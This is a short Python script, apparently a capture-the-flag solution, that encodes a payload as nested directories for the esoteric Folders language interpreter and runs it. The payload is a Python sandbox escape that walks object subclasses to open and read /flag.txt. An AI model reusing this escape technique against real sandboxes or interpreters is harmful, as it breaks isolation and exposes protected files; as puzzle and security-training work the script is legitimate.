import shutil
from subprocess import STDOUT, check_output
from os import mkdir, path
import time
import re

payload='a'.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('/flag.txt').read()

def cleanup():
    shutil.rmtree("out")
    time.sleep(1)

def createNdirs(n, path,name):
    if n>0:
        for t in range(n):
            mkdir(path+str(t+1)+name)

def newHexNumber(path, digit):
    createNdirs(2,path,"hexnumber")
    createNdirs(4,path+"1hexnumber/","firstquart")
    createNdirs(4,path+"2hexnumber/","secondquart")
    first="{0:04b}".format(int(digit[0], 16))
    second="{0:04b}".format(int(digit[1], 16))
    print(first+" "+second+" ")
    for s in range(len(first)):
       createNdirs(int(first[s]),path+"1hexnumber/"+str(s+1)+"firstquart/","aone")
    for s in range(len(second)):
       createNdirs(int(second[s]),path+"2hexnumber/"+str(s+1)+"secondquart/","aone")
    print("hell")

def PrintCommand(lineCounter,string):
    createNdirs(1,"out/",str(lineCounter)+"Command")
    createNdirs(2,"out/"+str(lineCounter)+"1"+"Command/","cmdtype")
    createNdirs(4,"out/"+str(lineCounter)+"1"+"Command/1cmdtype/","printtype")
    createNdirs(3,"out/"+str(lineCounter)+"1"+"Command/2cmdtype/","exp")
    createNdirs(5,"out/"+str(lineCounter)+"1"+"Command/2cmdtype/1exp/","literaltype")
    createNdirs(2,"out/"+str(lineCounter)+"1"+"Command/2cmdtype/2exp/","string")
    createNdirs(len(string),"out/"+str(lineCounter)+"1"+"Command/2cmdtype/3exp/","value")
    hexstring=string.encode('utf-8').hex()
    arr=re.findall('..',hexstring)
    print(arr)
    for i in range(len(arr)):
        print("hello")
        newHexNumber("out/"+str(lineCounter)+"1"+"Command/2cmdtype/3exp/"+str(i+1)+"value/",arr[i])


def main():
    lc=1
    cleanup()
    input="Hello, World!"
    mkdir("out")
    PrintCommand(lc,payload)
    lc+=1
    
    result=check_output(["python","/home/anton/git/Folders.py/folders/folders.py", f"out"], stderr=STDOUT, timeout=15)
    print(result)
    print(result.decode())



if __name__ == '__main__':
    main()